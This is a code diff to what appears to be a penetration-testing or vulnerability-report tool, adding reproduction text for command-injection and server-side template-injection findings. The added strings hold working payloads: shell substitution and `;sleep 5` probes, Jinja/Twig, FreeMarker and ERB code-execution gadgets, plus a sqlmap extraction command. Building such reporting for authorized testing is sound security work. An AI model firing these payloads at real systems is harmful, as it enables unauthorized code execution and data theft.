@@ -666,9 +666,24 @@ def _generic_concrete_repro(finding: dict[str, Any], class_id: str, url: str,
                      "and replay it — the server accepts your forged token as authenticated (arbitrary "
                      "token forgery / privilege escalation).")
         poc = _jwt_forge_poc(pe)
+    elif class_id == "rce":
+        steps.append("The benign `$(expr 111 + 111)` shell substitution was evaluated server-side (→ 222), "
+                     "proving the parameter reaches an OS shell. Confirm blind execution with a time-based probe "
+                     "(append `;sleep 5` and observe the ~5s delay), then escalate to full command execution "
+                     "within scope — stop at a benign marker such as `id` or `whoami`, never a destructive payload.")
     elif class_id == "ssti":
-        steps.append("The template engine evaluated the injected expression server-side (7*7 → 49). "
-                     "Escalate to command execution with the engine-specific payload for the detected engine.")
+        mv = matched.lower()
+        if "jinja" in mv or "twig" in mv:
+            gadget = "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
+        elif "freemarker" in mv or "jsp" in mv:
+            gadget = "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+        elif "erb" in mv or "ejs" in mv:
+            gadget = "<%= `id` %>"
+        else:
+            gadget = "the detected engine's code-execution gadget"
+        steps.append("The template engine evaluated the injected expression server-side (7*7 → 49), confirming "
+                     f"SSTI — a path to RCE on this engine. Escalate within scope with the engine gadget, e.g. `{gadget}`, "
+                     "stopping at a benign marker (`id` / `whoami`).")
     elif class_id == "sqli":
         steps.append("The parameter is injectable. Point sqlmap at this exact request to extract data — "
                      "e.g. `sqlmap -u '<the request URL above>' -p <param> --batch --dbs` — within scope.")
